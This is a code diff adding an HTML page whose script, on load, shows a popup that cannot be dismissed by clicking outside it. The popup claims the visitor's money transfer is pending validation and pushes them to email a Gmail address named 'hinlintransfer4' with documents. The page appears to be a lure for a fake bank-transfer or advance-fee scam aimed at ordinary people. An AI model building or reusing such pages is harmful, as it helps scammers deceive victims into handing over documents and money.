@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.1.2/dist/sweetalert2.all.min.js"></script>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11.1.2/dist/sweetalert2.min.css">
+</head>
+<body>
+    <script>
+        function sdftsdfghj(){
+            Swal.fire({
+            icon: 'error',
+            title: 'Oops...',
+            text: `Hi, your transfer is about to be validated, please provide the necessary documents and follow the instructions to make it effective at the recipient's bank.`,
+            cancelButtonText:"Already received",
+            confirmButtonText: "Already contact",
+            didRender: () => {
+                // Personnaliser le bouton cancelButton pour inclure du HTML
+                const cancelButton = Swal.getCancelButton();
+                cancelButton.innerHTML = `<a href="mailto:hinlintransfer4@gmail.com?subject=Sujet%20Prédefini&body=Bonjour,%0A%0AVoici%20le%20message%20pré-rempli.">Envoyer un Email</a>`
+            },
+            showCancelButton: true,
+            allowOutsideClick: false,
+            }).then((result)=>{
+            if(result.isConfirmed){
+            var accesscodex = "IAJDGHNLEIFJHEIDJHEQIKAJHJEHH"
+            localStorage.setItem('accesscodex', accesscodex)
+            window.location.reload(); 
+            }
+            })
+        }sdftsdfghj()
+    </script>
+</body>
+</html>
